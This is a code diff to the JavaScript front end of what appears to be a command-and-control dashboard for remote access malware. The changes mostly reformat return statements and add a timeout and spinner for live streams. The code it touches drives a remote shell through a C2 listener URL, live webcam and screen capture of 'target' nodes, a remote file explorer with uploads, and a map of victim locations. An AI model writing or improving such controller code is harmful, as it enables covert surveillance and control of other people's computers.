@@ -17,6 +17,7 @@ let leafletMarkers = [];
 
 // --- Live View State ---
 let streamInterval = null;
+let streamTimeoutTracker = null; // New tracking variable for stream fetch timeout
 const STREAM_POLL_RATE = 250; 
 
 // --- Terminal & Filesystem State ---
@@ -32,9 +33,13 @@ const FS_POLL_TIMEOUT = 20000;
 // Bulletproof coordinate parser to prevent Leaflet NaN crashes
 function getSafeCoord(val, isLat) {
     const defaultCoord = isLat ? 28.5383 : -81.3792;
-    if (val === undefined || val === null || val === '') return defaultCoord;
+    if (val === undefined || val === null || val === '') {
+        return defaultCoord;
+    }
     const parsed = parseFloat(val);
-    if (isNaN(parsed)) return defaultCoord;
+    if (isNaN(parsed)) {
+        return defaultCoord;
+    }
     return parsed;
 }
 
@@ -53,7 +58,9 @@ document.addEventListener("DOMContentLoaded", () => {
 // ==========================================
 function initMap() {
     const mapContainer = document.getElementById('map-container');
-    if (!mapContainer || leafletMap) return;
+    if (!mapContainer || leafletMap) {
+        return;
+    }
 
     const worldBounds = [
         [-90, -180], 
@@ -83,7 +90,9 @@ function initMap() {
 }
 
 function renderMap() {
-    if (!leafletMap) return;
+    if (!leafletMap) {
+        return;
+    }
 
     leafletMarkers.forEach(m => leafletMap.removeLayer(m));
     leafletMarkers = [];
@@ -183,7 +192,6 @@ async function fetchData() {
         renderNodesList();
         renderMap();
         
-        // This triggers the Auto-File Explorer
         selectNode(activeNodeId); 
 
         statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Node found. Decrypting vault logs...';
@@ -240,7 +248,9 @@ async function fetchData() {
 // ==========================================
 function renderNodesList() {
     const container = document.getElementById('nodes-list');
-    if(!container) return;
+    if(!container) {
+        return;
+    }
     container.innerHTML = '';
     
     if (allNodes.length === 0) {
@@ -295,10 +305,8 @@ window.selectNode = function(nodeId) {
     appendTerminalText(`Session established. Authenticated as: ${nodeId}`, "system");
     document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via secure reverse proxy`;
     
-    // Automatically update panel ID
+    // Auto Load File System
     document.getElementById('fs-active-node').innerText = nodeId;
-    
-    // AUTOMATICALLY START FILE EXPLORER ON AUTHENTICATION
     requestDirectoryListing('DRIVES');
 
     if (terminalPollInterval) {
@@ -306,7 +314,9 @@ window.selectNode = function(nodeId) {
     }
     
     terminalPollInterval = setInterval(async () => {
-        if (!activeNodeId) return;
+        if (!activeNodeId) {
+            return;
+        }
         try {
             const res = await fetch(`${C2_LISTENER_URL}/shell/${activeNodeId}`, {
                 headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
@@ -325,10 +335,14 @@ window.selectNode = function(nodeId) {
 
 function appendTerminalText(msg, type="system") {
     const term = document.getElementById('terminal-output');
-    if(!term) return;
+    if(!term) {
+        return;
+    }
     
     const promptEl = term.querySelector('.terminal-prompt');
-    if (promptEl) promptEl.remove();
+    if (promptEl) {
+        promptEl.remove();
+    }
 
     const line = document.createElement('div');
     if (type === "system") {
@@ -357,7 +371,9 @@ window.termLog = function(msg) {
 
 window.executeTermCommand = function(inputEl) {
     const val = inputEl.value.trim();
-    if(!val) return;
+    if(!val) {
+        return;
+    }
     
     appendTerminalText(`C:\\Users\\System> ${val}`, "user");
     
@@ -413,36 +429,28 @@ async function sendCommandToNode(deviceId, command) {
 }
 
 // ==========================================
-// LIVE VIEW STREAMING & MODULE SHORTCUTS
+// LIVE VIEW STREAMING 
 // ==========================================
-window.triggerModuleShortcut = function(action) {
-    if(!activeNodeId) return showToast("No active node!", "error");
-
-    if (action === 'cam') {
-        document.getElementById('streamTarget').value = 'WEBCAM';
-        if(!streamInterval) {
-            startStream();
-        }
-    } else if (action === 'screen') {
-        document.getElementById('streamTarget').value = 'SCREEN_-1';
-        if(!streamInterval) {
-            startStream();
-        }
-    } else if (action === 'fs') {
-        const fsPanel = document.getElementById('panel-fs');
-        
-        // Un-minimize if it's currently collapsed
-        if (fsPanel.dataset.minimized === 'true') {
-            toggleMinimize(fsPanel.querySelector('.fa-window-restore').parentElement, 'panel-fs');
-        }
-        
-        // Highlight animation
-        fsPanel.classList.add('ring-2', 'ring-cyberBlue', 'scale-[1.01]', 'z-50');
-        setTimeout(() => {
-            fsPanel.classList.remove('ring-2', 'ring-cyberBlue', 'scale-[1.01]', 'z-50');
-        }, 500);
+// New loading state UI logic for streams
+function setStreamLoadingState() {
+    const spinner = document.getElementById('liveViewSpinner');
+    const imageEl = document.getElementById('liveViewImage');
+    
+    // Hide old frame, show spinner
+    imageEl.style.display = 'none';
+    spinner.style.display = 'flex';
+    spinner.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-3xl mb-2"></i><p class="text-gray-400 font-mono text-[10px]">Retrieving stream frames...</p>`;
+    
+    // Clear old tracker
+    if (streamTimeoutTracker) {
+        clearTimeout(streamTimeoutTracker);
     }
-};
+    
+    // Set 10s fail tracker
+    streamTimeoutTracker = setTimeout(() => {
+        spinner.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 text-3xl mb-2"></i><p class="text-gray-400 font-mono text-[10px] text-center px-4">Timeout exceeded (10s).<br>Target may be offline or unresponsive.</p>`;
+    }, 10000);
+}
 
 window.toggleStream = function() {
     if (!activeNodeId) {
@@ -481,17 +489,11 @@ window.startStream = async function() {
 
     const targetVal = document.getElementById('streamTarget').value;
     const quality = document.getElementById('streamQuality').value;
-
     const title = document.getElementById('liveViewTitle');
-    const imageEl = document.getElementById('liveViewImage');
-    const spinner = document.getElementById('liveViewSpinner');
     const toggleBtn = document.getElementById('streamToggleBtn');
     
-    // Show spinner
-    spinner.style.display = 'flex';
-    spinner.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-2xl mb-2"></i><p class="text-gray-500 font-mono text-[10px]">Awaiting frames...</p>`;
-    imageEl.src = "";
-    imageEl.style.display = 'none';
+    // Apply UI fetching state
+    setStreamLoadingState();
 
     // Change Play button to Stop button (Red)
     toggleBtn.className = "w-4 h-4 rounded-full bg-red-500/20 text-red-500 hover:bg-red-500 hover:text-white flex items-center justify-center text-[8px]";
@@ -512,6 +514,7 @@ window.startStream = async function() {
     document.getElementById('streamTarget').onchange = () => {
         if(streamInterval) {
             termLog(`Switching stream source...`);
+            setStreamLoadingState(); // Trigger load wait
             sendCommandToNode(activeNodeId, `START_STREAM:${document.getElementById('streamTarget').value}|${document.getElementById('streamQuality').value}`);
             
             if (document.getElementById('streamTarget').value.includes("SCREEN")) {
@@ -540,13 +543,22 @@ async function fetchFrame() {
         
         if (response.ok) {
             const data = await response.json();
-            const imageEl = document.getElementById('liveViewImage');
-            imageEl.src = `data:image/jpeg;base64,${data.frame}`;
-            document.getElementById('liveViewSpinner').style.display = 'none';
-            imageEl.style.display = 'block';
+            if (data && data.frame) {
+                const imageEl = document.getElementById('liveViewImage');
+                imageEl.src = `data:image/jpeg;base64,${data.frame}`;
+                
+                // Clear the fetching timeout once successful data applies
+                if (streamTimeoutTracker) {
+                    clearTimeout(streamTimeoutTracker);
+                    streamTimeoutTracker = null;
+                }
+                
+                document.getElementById('liveViewSpinner').style.display = 'none';
+                imageEl.style.display = 'block';
+            }
         }
     } catch (e) {
-        // Ignore fetch errors during fast polling
+        // Ignore fetch errors during fast polling to avoid console spam
     }
 }
 
@@ -555,6 +567,12 @@ window.stopStream = function() {
         clearInterval(streamInterval);
         streamInterval = null;
     }
+    
+    if (streamTimeoutTracker) {
+        clearTimeout(streamTimeoutTracker);
+        streamTimeoutTracker = null;
+    }
+    
     if (activeNodeId) {
         sendCommandToNode(activeNodeId, "STOP_STREAM");
         termLog(`Stream stopped for ${activeNodeId}.`);
@@ -582,7 +600,9 @@ window.stopStream = function() {
 // FILE EXPLORER
 // ==========================================
 function requestDirectoryListing(path) {
-    if (!activeNodeId) return;
+    if (!activeNodeId) {
+        return;
+    }
 
     if (fsPollInterval) {
         clearInterval(fsPollInterval);
@@ -816,9 +836,15 @@ window.triggerUpload = function() {
 
 document.getElementById('fileUploadInput').onchange = function(e) { 
     const file = e.target.files[0];
-    if(!file) return;
-    if(!currentFsPath || currentFsPath === 'DRIVES') return showToast("Navigate to a directory first.", "error");
-    if(file.size > 10 * 1024 * 1024) return showToast("File exceeds 10MB limit.", "error");
+    if(!file) {
+        return;
+    }
+    if(!currentFsPath || currentFsPath === 'DRIVES') {
+        return showToast("Navigate to a directory first.", "error");
+    }
+    if(file.size > 10 * 1024 * 1024) {
+        return showToast("File exceeds 10MB limit.", "error");
+    }
 
     const reader = new FileReader();
     reader.onload = function(evt) {
@@ -1018,7 +1044,9 @@ function initResizers() {
 
 function setupResizer(resizerId, prevId, nextId, isVertical) {
     const resizer = document.getElementById(resizerId);
-    if(!resizer) return; 
+    if(!resizer) {
+        return; 
+    }
     
     const prev = document.getElementById(prevId);
     const next = document.getElementById(nextId);
@@ -1064,7 +1092,9 @@ window.toggleMinimize = function(btn, panelId) {
     const buttonEl = btn.tagName === 'I' ? btn.parentElement : btn;
     const panel = document.getElementById(panelId);
     
-    if(!panel || panel.classList.contains('maximized')) return;
+    if(!panel || panel.classList.contains('maximized')) {
+        return;
+    }
 
     if (panel.dataset.minimized === 'true') {
         panel.dataset.minimized = 'false';
@@ -1080,7 +1110,9 @@ window.toggleMinimize = function(btn, panelId) {
 window.toggleMaximize = function(btn, panelId) {
     const buttonEl = btn.tagName === 'I' ? btn.parentElement : btn;
     const panel = document.getElementById(panelId);
-    if(!panel) return;
+    if(!panel) {
+        return;
+    }
     
     if (panel.classList.contains('maximized')) {
         panel.classList.remove('maximized');
